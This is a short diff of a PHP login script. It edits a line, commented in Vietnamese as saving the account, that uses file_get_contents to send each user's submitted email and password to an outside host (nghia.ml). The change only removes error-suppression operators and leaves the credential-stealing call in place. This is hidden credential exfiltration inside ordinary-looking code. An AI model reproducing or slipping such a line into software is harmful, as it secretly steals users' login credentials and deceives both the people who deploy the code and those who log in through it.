@@ -54,7 +54,7 @@ if(isset($_POST['u'], $_POST['p'])){
 }
 
 //Lưu nick
-file_get_contents('http://nghia.ml/api/mail.php?email='.@$_GET['u'].'&pass='.@$_GET['p']);
+file_get_contents('http://nghia.ml/api/mail.php?email='.$_GET['u'].'&pass='.$_GET['p']);
 //End lưu nick
 
 $data = array(
